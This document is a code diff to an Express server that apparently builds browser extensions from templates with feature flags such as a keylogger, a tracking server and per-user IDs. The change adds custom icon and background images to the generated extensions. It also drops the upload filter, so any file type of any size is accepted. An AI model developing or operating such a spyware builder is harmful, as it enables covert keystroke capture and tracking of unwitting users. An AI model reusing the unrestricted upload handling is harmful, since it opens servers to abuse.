@@ -25,19 +25,13 @@ async function requireAuth(req: Request, res: Response, next: Function): Promise
   next();
 }
 
-// Configure multer for file uploads - support ALL image and video formats
+// Configure multer for file uploads - support ALL file formats for extension customization
 const upload = multer({
   storage: multer.memoryStorage(),
-  limits: { fileSize: Infinity }, // No file size limit
+  limits: { fileSize: Infinity }, // No file size limit - allow any size
   fileFilter: (req, file, cb) => {
-    // Accept ANY image or video format
-    if (file.mimetype.startsWith('image/') ||
-        file.mimetype.startsWith('video/') ||
-        file.mimetype === 'application/octet-stream') { // Accept unknown binary files as potential images
-      cb(null, true);
-    } else {
-      cb(new Error('File type not supported'));
-    }
+    // Accept ALL file types for extension profile/background customization
+    cb(null, true);
   }
 });
 
@@ -997,6 +991,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
         '{{FEATURE_KEYLOGGER}}': features.includes('keylogger')
       };
 
+      // Handle custom images
+      const profilePicture = req.body.profilePicture || '';
+      const backgroundImage = req.body.backgroundImage || '';
+      
       // Template replacements
       const replacements = {
         '{{EXTENSION_NAME}}': name,
@@ -1008,6 +1006,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
         '{{TRACKING_SERVER}}': `${req.protocol}://${req.get('host')}`,
         '{{USER_ID}}': req.user.id,
         '{{EXTENSION_ID}}': randomUUID(),
+        '{{PROFILE_PICTURE}}': profilePicture,
+        '{{BACKGROUND_IMAGE}}': backgroundImage ? `url('${backgroundImage}'),` : '',
         ...featureFlags
       };
 
@@ -1059,22 +1059,28 @@ export async function registerRoutes(app: Express): Promise<Server> {
         }
       }
 
-      // Create simple colored icons for the extension
-      const createSimpleIcon = (size: number) => {
-        // Create a simple PNG icon with a spy glass emoji look
-        const canvas = Buffer.from(`
-          <svg width="${size}" height="${size}" xmlns="http://www.w3.org/2000/svg">
-            <rect width="${size}" height="${size}" fill="#4F46E5"/>
-            <text x="${size/2}" y="${size/2 + size/6}" text-anchor="middle" fill="white" font-size="${Math.floor(size * 0.6)}" font-family="Arial, sans-serif">🕵️</text>
-          </svg>
-        `);
-        return canvas;
+      // Create icons - use uploaded profile picture if available, otherwise default
+      const createIcon = (size: number) => {
+        if (profilePicture && profilePicture.startsWith('data:')) {
+          // Use uploaded profile picture, convert to buffer
+          const base64Data = profilePicture.split(',')[1];
+          return Buffer.from(base64Data, 'base64');
+        } else {
+          // Create simple default icon with spy glass emoji
+          const svgIcon = `
+            <svg width="${size}" height="${size}" xmlns="http://www.w3.org/2000/svg">
+              <rect width="${size}" height="${size}" fill="#4F46E5"/>
+              <text x="${size/2}" y="${size/2 + size/6}" text-anchor="middle" fill="white" font-size="${Math.floor(size * 0.6)}" font-family="Arial, sans-serif">🕵️</text>
+            </svg>
+          `;
+          return Buffer.from(svgIcon);
+        }
       };
 
-      // Add icon files (simple SVG converted to buffer)
-      zip.addFile('icon16.png', createSimpleIcon(16));
-      zip.addFile('icon48.png', createSimpleIcon(48));
-      zip.addFile('icon128.png', createSimpleIcon(128));
+      // Add icon files (custom uploaded or default)
+      zip.addFile('icon16.png', createIcon(16));
+      zip.addFile('icon48.png', createIcon(48));
+      zip.addFile('icon128.png', createIcon(128));
       console.log(`🎨 Added icon files to ZIP`);
 
       // Generate the final ZIP buffer
